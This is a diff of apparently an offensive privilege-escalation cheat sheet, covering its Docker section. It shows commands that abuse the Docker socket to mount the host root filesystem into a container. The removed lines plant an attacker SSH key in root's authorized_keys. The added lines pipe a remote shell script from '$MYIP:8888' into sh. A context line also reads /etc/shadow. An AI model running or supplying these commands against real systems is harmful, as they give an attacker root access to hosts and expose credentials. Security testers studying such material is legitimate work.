@@ -861,10 +861,11 @@ cat /etc/shadow
 
 [*] Containers
 +---------- Docker ----------+
-curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
-curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
-curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuHzq.......................... root@kali >> /var/tmp/root/.ssh/authorized_keys"]}'
-curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http://localhost/containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
+curl -s --unix-socket /var/run/docker.sock http:/./images/json
+curl -s --unix-socket /var/run/docker.sock http:/./containers/json
+curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:8888/shells/resh | sh"]}'
+curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
+ls -la /var/tmp
 
 cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
 docker ps -a
